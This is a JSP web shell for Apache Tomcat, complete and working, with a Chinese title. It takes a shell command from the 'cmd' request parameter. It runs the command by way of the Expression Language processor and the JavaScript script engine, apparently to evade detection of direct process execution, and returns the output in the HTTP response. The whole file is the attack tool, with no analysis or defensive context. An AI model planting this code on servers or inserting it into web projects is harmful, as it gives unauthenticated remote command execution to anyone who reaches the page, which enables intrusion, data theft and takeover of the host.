<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>Tomcat EL的JSP WebShell</h2>
<%
    StringBuilder stringBuilder = new StringBuilder();
    String cmd = request.getParameter("cmd");
    for (String tmp:cmd.split(" ")) {
        stringBuilder.append("'").append(tmp).append("'").append(",");
    }
    String f = stringBuilder.substring(0, stringBuilder.length() - 1);
    ELProcessor processor = new ELProcessor();
    Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")");
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder2 = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder2.append(line).append("\n");
    }
    if (stringBuilder2.length() > 0) {
        response.getOutputStream().write(stringBuilder2.toString().getBytes());
    }
%>
</body>
</html>